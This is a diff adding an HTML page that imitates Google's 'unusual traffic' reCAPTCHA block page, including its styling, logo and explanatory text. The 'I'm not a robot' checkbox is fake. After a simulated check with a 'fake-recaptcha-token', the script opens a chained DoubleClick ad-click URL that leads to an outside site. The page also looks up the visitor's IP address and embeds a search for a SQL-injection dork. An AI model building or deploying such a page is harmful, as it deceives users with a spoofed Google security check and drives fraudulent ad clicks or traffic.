@@ -1,1 +1,584 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="initial-scale=1"><title>https://www.google.com/search?sca_esv=cdd4458fa27f824d&amp;sxsrf=AE3TifO-oh2KL7DhD-ScI81zcCRli_xVFg:1757972977263&amp;q=inurl+index.php+id%3D1&amp;sa=X&amp;ved=2ahUKEwiKptbW39uPAxXTF1kFHYNnI2YQ1QJ6BAgpEAE&amp;biw=1920&amp;bih=945&amp;dpr=1.5</title>
+<style>
+/* Точная копия оригинального Google reCAPTCHA */
+#checkbox-window {
+    display: inline-block;
+    border: 2px solid #dadce0;
+    border-radius: 2px;
+    background: #fff;
+    padding: 0;
+    font-family: Roboto, Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.4;
+    width: 304px;
+    height: 94px;
+    box-shadow: 0 0 0 1px rgba(0,0,0,0.1);
+    position: relative;
+    cursor: pointer;
+}
 
+.sc-hwkwBN {
+    display: flex;
+    align-items: center;
+    padding: 8px 14px;
+    height: 100%;
+    box-sizing: border-box;
+}
+
+#checkbox {
+    width: 40px;
+    height: 40px;
+    border: 2px solid #dadce0;
+    border-radius: 2px;
+    background: #fff;
+    cursor: pointer;
+    margin-right: 14px;
+    position: relative;
+    transition: all 0.3s ease;
+    flex-shrink: 0;
+}
+
+#checkbox:hover {
+    border-color: #5f6368;
+    box-shadow: 0 0 0 1px #5f6368;
+}
+
+#checkbox.checked {
+    background: #4285f4;
+    border-color: #4285f4;
+    box-shadow: none;
+}
+
+#checkbox.hiding {
+    opacity: 0;
+    transform: scale(0.8);
+}
+
+#checkbox.checked::after {
+    content: '';
+    position: absolute;
+    top: 8px;
+    left: 14px;
+    width: 8px;
+    height: 16px;
+    border: solid white;
+    border-width: 0 4px 4px 0;
+    transform: rotate(45deg);
+}
+
+#robot-label {
+    margin: 0;
+    color: #3c4043;
+    font-size: 14px;
+    font-weight: 700;
+    line-height: 1.4;
+    user-select: none;
+    transition: opacity 0.3s ease;
+}
+
+#robot-label.hidden {
+    opacity: 0;
+}
+
+.sc-lgpSej {
+    position: absolute;
+    right: 8px;
+    top: 6px;
+    display: flex;
+    align-items: center;
+    background: #f9f9f9;
+    padding: 3px 6px;
+    border-radius: 2px;
+    border: 1px solid #dadce0;
+}
+
+.sc-eqYatC {
+    width: 20px;
+    height: 20px;
+    margin-right: 4px;
+}
+
+.sc-kcLKEh {
+    color: #5f6368;
+    font-size: 11px;
+    font-weight: 400;
+    font-family: Roboto, Helvetica, Arial, sans-serif;
+}
+
+.sc-dntSTA {
+    position: absolute;
+    bottom: 2px;
+    right: 8px;
+    margin: 0;
+    font-size: 8px;
+    color: #5f6368;
+    font-family: Roboto, Helvetica, Arial, sans-serif;
+}
+
+.sc-dntSTA a {
+    color: #1a73e8;
+    text-decoration: none;
+}
+
+.sc-dntSTA a:hover {
+    text-decoration: underline;
+}
+
+#spinner {
+    display: none;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 10;
+    width: 60px;
+    height: 60px;
+}
+
+#spinner.show {
+    display: block;
+}
+
+.sc-kvnevz {
+    width: 54px;
+    height: 54px;
+}
+
+.sc-dFVmKS {
+    width: 100%;
+    height: 100%;
+    animation: spin 1.2s linear infinite;
+}
+
+.sc-kCuUfV {
+    fill: none;
+    stroke: #dadce0;
+    stroke-width: 2.5;
+    stroke-linecap: round;
+}
+
+.sc-dNdcvo {
+    fill: none;
+    stroke: #4285f4;
+    stroke-width: 2.5;
+    stroke-linecap: round;
+    stroke-dasharray: 60;
+    stroke-dashoffset: 60;
+    animation: dash 1.8s ease-in-out infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes dash {
+    0% { 
+        stroke-dashoffset: 60;
+        opacity: 1;
+    }
+    50% { 
+        stroke-dashoffset: 0;
+        opacity: 1;
+    }
+    100% { 
+        stroke-dashoffset: -60;
+        opacity: 0.8;
+    }
+}
+
+/* Позиционирование для формы */
+#captcha-form {
+    text-align: left;
+    margin: 20px 0;
+}
+
+#checkbox-window {
+    margin: 0;
+    transform: scale(0.9);
+    transform-origin: left top;
+}
+
+/* Дополнительные стили для точного соответствия */
+#checkbox-window:hover {
+    border-color: #5f6368;
+    box-shadow: 0 0 0 1px #5f6368;
+}
+
+#checkbox-window.checked {
+    border-color: #4285f4;
+    box-shadow: 0 0 0 1px #4285f4;
+}
+
+/* Адаптивные стили */
+@media (max-width: 768px) {
+    body {
+        padding: 10px;
+        font-size: 16px;
+    }
+    
+    .container {
+        max-width: 100%;
+        margin: 0;
+        padding: 0 10px;
+    }
+    
+    #infoDiv {
+        font-size: 12px;
+        padding: 8px;
+    }
+    
+    .sc-dntSTA a {
+        font-size: 8px;
+    }
+    
+    #spinner {
+        width: 54px;
+        height: 54px;
+    }
+    
+    #checkbox-window {
+        width: 100%;
+        max-width: 304px;
+        height: 94px;
+        transform: scale(0.85);
+        transform-origin: left top;
+    }
+    
+    .sc-hwkwBN {
+        padding: 6px 10px;
+    }
+    
+    #checkbox {
+        width: 36px;
+        height: 36px;
+        margin-right: 10px;
+        border-width: 2px;
+    }
+    
+    #checkbox.checked::after {
+        top: 6px;
+        left: 12px;
+        width: 7px;
+        height: 14px;
+        border-width: 0 3px 3px 0;
+    }
+    
+    #robot-label {
+        font-size: 13px;
+    }
+    
+    .sc-lgpSej {
+        right: 6px;
+        top: 6px;
+        padding: 3px 6px;
+    }
+    
+    .sc-eqYatC {
+        width: 20px;
+        height: 20px;
+        margin-right: 4px;
+    }
+    
+    .sc-kcLKEh {
+        font-size: 10px;
+    }
+    
+    .sc-dntSTA {
+        bottom: 3px;
+        right: 6px;
+        font-size: 8px;
+    }
+}
+
+@media (max-width: 480px) {
+    body {
+        padding: 5px;
+        font-size: 14px;
+    }
+    
+    .container {
+        margin: 0;
+        padding: 0 5px;
+    }
+    
+    #infoDiv {
+        font-size: 11px;
+        padding: 6px;
+        line-height: 1.3;
+    }
+    
+    #infoDiv a {
+        font-size: 11px;
+    }
+    
+    #checkbox-window {
+        width: 100%;
+        max-width: 280px;
+        height: 88px;
+        transform: scale(0.8);
+        transform-origin: left top;
+    }
+    
+    .sc-hwkwBN {
+        padding: 5px 8px;
+    }
+    
+    #checkbox {
+        width: 32px;
+        height: 32px;
+        margin-right: 8px;
+        border-width: 2px;
+    }
+    
+    #checkbox.checked::after {
+        top: 4px;
+        left: 10px;
+        width: 6px;
+        height: 12px;
+        border-width: 0 3px 3px 0;
+    }
+    
+    #robot-label {
+        font-size: 12px;
+    }
+    
+    .sc-lgpSej {
+        right: 4px;
+        top: 4px;
+        padding: 2px 4px;
+    }
+    
+    .sc-eqYatC {
+        width: 18px;
+        height: 18px;
+        margin-right: 3px;
+    }
+    
+    .sc-kcLKEh {
+        font-size: 9px;
+    }
+    
+    .sc-dntSTA {
+        bottom: 2px;
+        right: 4px;
+        font-size: 7px;
+    }
+    
+    .sc-dntSTA a {
+        font-size: 7px;
+    }
+    
+    #spinner {
+        width: 48px;
+        height: 48px;
+    }
+}
+
+@media (max-width: 320px) {
+    body {
+        padding: 3px;
+        font-size: 12px;
+    }
+    
+    .container {
+        margin: 0;
+        padding: 0 3px;
+    }
+    
+    #infoDiv {
+        font-size: 10px;
+        padding: 4px;
+        line-height: 1.2;
+    }
+    
+    #infoDiv a {
+        font-size: 10px;
+    }
+    
+    #checkbox-window {
+        width: 100%;
+        max-width: 260px;
+        height: 82px;
+        transform: scale(0.75);
+        transform-origin: left top;
+    }
+    
+    .sc-hwkwBN {
+        padding: 4px 6px;
+    }
+    
+    #checkbox {
+        width: 28px;
+        height: 28px;
+        margin-right: 6px;
+        border-width: 2px;
+    }
+    
+    #checkbox.checked::after {
+        top: 2px;
+        left: 8px;
+        width: 5px;
+        height: 10px;
+        border-width: 0 3px 3px 0;
+    }
+    
+    #robot-label {
+        font-size: 11px;
+    }
+    
+    .sc-lgpSej {
+        right: 3px;
+        top: 3px;
+        padding: 1px 3px;
+    }
+    
+    .sc-eqYatC {
+        width: 16px;
+        height: 16px;
+        margin-right: 2px;
+    }
+    
+    .sc-kcLKEh {
+        font-size: 8px;
+    }
+    
+    .sc-dntSTA {
+        bottom: 1px;
+        right: 3px;
+        font-size: 6px;
+    }
+    
+    .sc-dntSTA a {
+        font-size: 6px;
+    }
+    
+    #spinner {
+        width: 42px;
+        height: 42px;
+    }
+}
+</style>
+</head>
+<body style="font-family: arial, sans-serif; background-color: #fff; color: #000; padding:20px; font-size:18px; overscroll-behavior:contain; margin:0;" onload="e=document.getElementById('captcha');if(e){e.focus();} if(solveSimpleChallenge) {solveSimpleChallenge(0,0);}">
+<div class="container" style="max-width:400px; margin:0; width:100%;">
+<hr noshade size="1" style="color:#ccc; background-color:#ccc;"><br>
+<form id="captcha-form" action="index" method="post">
+<noscript>
+<div style="font-size:13px;">
+  In order to continue, please enable javascript on your web browser.
+</div>
+</noscript>
+<script src="https://www.google.com/recaptcha/enterprise.js" async defer></script>
+<script>
+// URL для перенаправления после прохождения капчи
+var redirectUrl = 'https://ad.doubleclick.net/searchads/link/click?lid=&ds_s_kwgid=&ds_a_cid=&ds_a_caid=&ds_a_agid=&ds_a_fiid=&ds_a_lid=&ds_a_extid=&&ds_e_adid=&ds_e_matchtype=search&ds_e_device=c&ds_e_network=g&&ds_url_v=2&ds_dest_url=https://clickserve.dartsearch.net/link/click?lid=123456789&url=%7Blpurl%7D&id=5&ds_s_kwgid=987654321&ds_e_adid=%7Bcreative%7D&ds_e_matchtype=%7Bifsearch:search%7D%7Bifcontent:content%7D&ds_e_device=%7Bdevice%7D&ds_e_network=%7Bnetwork%7D&ds_url_v=2&ds_dest_url=https://4vanguard.com';
+
+var submitCallback = function(response) {
+    // Открываем URL в новой вкладке после прохождения капчи
+    window.open(redirectUrl, '_blank');
+    // Также можно отправить форму, если нужно
+    // document.getElementById('captcha-form').submit();
+};
+</script>
+<script>
+// Функция для получения IP-адреса
+function getIPAddress() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ip-address').textContent = data.ip;
+        })
+        .catch(error => {
+            document.getElementById('ip-address').textContent = 'Unable to detect';
+        });
+}
+
+// Функция для получения текущего времени
+function getCurrentTime() {
+    const now = new Date();
+    const timeString = now.toISOString();
+    document.getElementById('current-time').textContent = timeString;
+}
+
+// Функция для получения текущего URL
+function getCurrentURL() {
+    document.getElementById('current-url').textContent = window.location.href;
+}
+
+// Функция для обработки клика по чекбоксу
+function handleCheckboxClick() {
+    const checkbox = document.getElementById('checkbox');
+    const checkboxWindow = document.getElementById('checkbox-window');
+    const spinner = document.getElementById('spinner');
+    const robotLabel = document.getElementById('robot-label');
+    
+    // Если чекбокс уже отмечен, не делаем ничего
+    if (checkbox.classList.contains('checked')) {
+        return;
+    }
+    
+    // Отмечаем чекбокс
+    checkbox.classList.add('checked');
+    checkboxWindow.classList.add('checked');
+    
+    // Скрываем текст "I'm not a robot"
+    if (robotLabel) {
+        robotLabel.classList.add('hidden');
+    }
+    
+    // Плавно скрываем чекбокс и показываем спиннер
+    setTimeout(() => {
+        checkbox.classList.add('hiding');
+        setTimeout(() => {
+            checkbox.style.display = 'none';
+            spinner.classList.add('show');
+        }, 300);
+    }, 200);
+    
+    // Симулируем проверку reCAPTCHA
+    setTimeout(() => {
+        spinner.classList.remove('show');
+        // Вызываем callback функцию
+        submitCallback('fake-recaptcha-token');
+    }, 2500);
+}
+
+// Выполняем все функции при загрузке страницы
+window.onload = function() {
+    getIPAddress();
+    getCurrentTime(); // Время фиксируется в момент загрузки страницы
+    getCurrentURL();
+    
+    // Добавляем обработчик клика для чекбокса
+    const checkbox = document.getElementById('checkbox');
+    if (checkbox) {
+        checkbox.addEventListener('click', handleCheckboxClick);
+    }
+    
+    // Убираем обновление времени каждую секунду
+    // setInterval(getCurrentTime, 1000);
+};
+</script>
+<div id="checkbox-window" class="sc-jJLAfE chNRRm"><div class="sc-hwkwBN kPFwQp"><button type="button" id="checkbox" class="sc-kNOymR jzkzNv"></button><p id="robot-label" class="sc-dYwGCk eUZsUl">I'm not a robot</p></div><div class="sc-lgpSej bopGGJ"><img alt="" class="sc-eqYatC jaGrSh" src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span class="sc-kcLKEh DRwC">reCAPTCHA</span></div><p class="sc-dntSTA cmACHk"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener">Privacy</a>&nbsp;-&nbsp;<a href="https://policies.google.com/terms?hl=en" target="_blank" rel="noopener">Terms</a></p><div id="spinner" aria-hidden="true" class="sc-kvnevz hCekLs"><svg viewBox="0 0 72 72" aria-hidden="true" class="sc-dFVmKS ejIlRV"><circle cx="36" cy="36" r="30" pathLength="100" class="sc-kCuUfV kNKytR"></circle><circle cx="36" cy="36" r="30" pathLength="100" class="sc-dNdcvo dlqHZA"></circle></svg></div></div>
+
+<input type='hidden' name='q' value='EgRib8s9GKGUosYGIjD7u4o5kkVoKryzjnMDTVw6R49BpZ22RKl7EmMdMiJUxg7RW66b94lvx3tFQq5-yxMyAnJSWgFD'><input type="hidden" name="continue" value="https://www.google.com/search?sca_esv=cdd4458fa27f824d&amp;sxsrf=AE3TifO-oh2KL7DhD-ScI81zcCRli_xVFg:1757972977263&amp;q=inurl+index.php+id%3D1&amp;sa=X&amp;ved=2ahUKEwiKptbW39uPAxXTF1kFHYNnI2YQ1QJ6BAgpEAE&amp;biw=1920&amp;bih=945&amp;dpr=1.5">
+</form>
+<hr noshade size="1" style="color:#ccc; background-color:#ccc;">
+
+<div style="font-size:13px; line-break: anywhere;">
+<b>About this page</b><br><br>
+
+Our systems have detected unusual traffic from your computer network.  This page checks to see if it&#39;s really you sending the requests, and not a robot.  <a href="#" onclick="document.getElementById('infoDiv').style.display='block';">Why did this happen?</a><br><br>
+
+<div id="infoDiv" style="display:none; background-color:#eee; padding:10px; margin:0 0 15px 0; line-height:1.4em;">
+This page appears when Google automatically detects requests coming from your computer network which appear to be in violation of the <a href="//www.google.com/policies/terms/">Terms of Service</a>. The block will expire shortly after those requests stop.  In the meantime, solving the above CAPTCHA will let you continue to use our services.<br><br>This traffic may have been sent by malicious software, a browser plug-in, or a script that sends automated requests.  If you share your network connection, ask your administrator for help &mdash; a different computer using the same IP address may be responsible.  <a href="//support.google.com/websearch/answer/86640">Learn more</a><br><br>Sometimes you may be asked to solve the CAPTCHA if you are using advanced terms that robots are known to use, or sending requests very quickly.
+</div>
+
+IP address: <span id="ip-address">Loading...</span><br>Time: <span id="current-time">Loading...</span><br>URL: <span id="current-url">Loading...</span><br>
+</div>
+</div>
+</body>
+</html>
